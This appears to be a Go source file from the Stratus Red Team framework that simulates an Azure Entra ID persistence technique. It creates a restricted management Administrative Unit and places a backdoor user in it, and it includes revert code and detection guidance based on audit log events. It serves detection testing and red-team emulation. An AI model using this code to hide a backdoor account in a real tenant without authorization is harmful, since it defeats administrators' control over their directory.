package azure

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	graph "github.com/microsoftgraph/msgraph-sdk-go"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	betagraph "github.com/microsoftgraph/msgraph-beta-sdk-go"
	betagraphmodels "github.com/microsoftgraph/msgraph-beta-sdk-go/models"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strings"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.persistence.restricted-au",
		FriendlyName: "Restricted Backdoor Account Through Restricted Management AU",
		Description: `
Create a [restricted management Administrative Unit (AU)](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/admin-units-restricted-management), and place a backdoor account in it to simulate a protected attacker-controlled user.

Warm-up:

- Create Entra ID user (Backdoor)

Detonation:

- Create restricted management AU
- Add Backdoor user to AU

References:

- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units
- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/admin-units-restricted-management

`,
Detection: `
Identify the following <code>activityDisplayName</code> events in Entra ID Audit logs.

For <code>Service: Core Directory</code>,<code>Category: AdministrativeUnit</code>:
Add administrative unit
Add member to restricted management administrative unit

Consider detection of additional Administrative Unit activities and scoped role assignments in the following Microsoft article:
- https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	// Fetch details from TF
	backdoorUserId := params["backdoor_user_id"]
	backdoorUserName := params["backdoor_user_name"]
	suffix := params["suffix"]

	//graphClient setup
	betaGraphClient, _ := betagraph.NewGraphServiceClientWithCredentials(providers.Azure().GetCredentials(), nil)
	graphClient, _ := graph.NewGraphServiceClientWithCredentials(providers.Azure().GetCredentials(), nil)

	// 1. Create Restricted AU
	requestBodyAU := betagraphmodels.NewAdministrativeUnit()
	displayName := fmt.Sprintf("Stratus Restricted AU - %s", suffix)
	requestBodyAU.SetDisplayName(&displayName) 
	description := "Restricted management AU created from Stratus"
	requestBodyAU.SetDescription(&description) 
	restricted := true
	requestBodyAU.SetIsMemberManagementRestricted(&restricted)

	auResult, err := betaGraphClient.Directory().AdministrativeUnits().Post(context.Background(), requestBodyAU, nil)

	if err != nil {
		return errors.New("could not create AU: " + err.Error())
	}

	// 1.a. Save AU ID from creation activity
	auId := *auResult.GetId()
	log.Println("Created restricted management AU " + auId)

	// 2. Add Target member to Hidden AU
	requestBodyMember := graphmodels.NewReferenceCreate()
	odataId := fmt.Sprintf("https://graph.microsoft.com/v1.0/users/%s", backdoorUserId)
	requestBodyMember.SetOdataId(&odataId)
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Members().Ref().Post(context.Background(), requestBodyMember, nil)

	if err != nil {
		return errors.New("could not add member to AU: " + err.Error())
	}
	log.Println("Added backdoor user " + backdoorUserName + " to AU")
	
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// AU ID from detonate
	suffix := fmt.Sprintf(" - %s", params["suffix"])

	//graphClient setup
	graphClient, _ := graph.NewGraphServiceClientWithCredentials(providers.Azure().GetCredentials(), nil)

	// 1. Get ID of Stratus created AU
	auResult, err := graphClient.Directory().AdministrativeUnits().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not fetch AUs: " + err.Error())
	}

	var auId string
	for _, au := range auResult.GetValue() {
		auName := *au.GetDisplayName()
		if strings.HasSuffix(auName, suffix){
			auId = *au.GetId()
			break
		}
	}

	// 4. Delete Restricted AU
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)

	if err != nil {
		return errors.New("could not delete AU: " + err.Error())
	}

	log.Println("AU deleted")

	// Alert user to long wait time for cleanup. Have not found a way around this wait time.
	log.Println("[!] WARNING: User's restricted management property can take approx. 5 minutes to update. If 'stratus cleanup' fails, please wait 5 minutes for user status to update and try again.")

	return nil
}